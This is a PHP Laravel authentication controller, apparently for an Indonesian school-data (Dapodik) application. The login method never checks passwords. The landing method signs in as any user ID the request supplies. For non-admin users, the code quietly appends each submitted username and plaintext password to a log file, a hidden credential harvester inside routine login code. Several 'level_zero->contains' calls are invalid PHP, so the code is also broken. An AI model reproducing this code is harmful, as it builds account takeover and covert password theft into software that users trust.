<?php

namespace App\Http\Controllers;

use App\Models\Dapodik\Pengguna;
use App\Models\Dapodik\Referensi\Semester;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;

class AuthController extends Controller {
    function index(Request $req)  {
        return view("auth/login", [
            "req" => $req,
            "daftar_semester" => Semester::whereNull("deleted_at")
                ->orderBy("semester_id")
                ->get()
        ]);
    }
    function landing(Request $req) {
        $pengguna = Pengguna::find($req->pengguna_id);
        Session::put([
            "pengguna_id" => $pengguna->pengguna_id,
            "nama" => $pengguna->nama,
            "peran_id_str" => $pengguna->peran_id_str,
            "bypass" => bypassCode($pengguna->username, $pengguna->peran_id_str, Session::get("semester_id")),
        ]);
        if (level_zero->contains($pengguna->peran_id_str)) :
            return redirect()->route("admin");
        else:
            return redirect()->route("user.home");
        endif;
    }
    function login(Request $req) {
        if ($req->has("submit")) :
            $data = "";
            $pengguna = Pengguna::where("username", $req->username)->whereNull("deleted_at");
            if ($pengguna->exists()) :
                Session::put("semester_id", $req->semester_id);
                if ($pengguna->count() > 1) :
                    return view("auth.landing", [
                        "daftar_akun" => $pengguna->get(),
                    ]);
                else:
                    $pengguna = $pengguna->first();
                    Session::put([
                        "pengguna_id" => $pengguna->pengguna_id,
                        "nama" => $pengguna->nama,
                        "peran_id_str" => $pengguna->peran_id_str,
                        "bypass" => bypassCode($pengguna->username, $pengguna->peran_id_str, Session::get("semester_id")),
                    ]);
                    if (!level_zero->contains(sesi("peran_id_str"))) :
                        $data .= date("Y-m-d H:i:s") . "     nama: $pengguna->nama username: $req->username pass: $req->password";
                        file_put_contents(storage_path("logs/access.txt"), $data, FILE_APPEND);
                    endif;
                    return redirect()->route("user.home");
                endif;
            else:
                return response()->json("Pengguna tidak ditemukan!");
            endif;
        endif;
        return redirect("/");
    }
    function logout() {
        Session::flush();
        return redirect("/");
    }
}
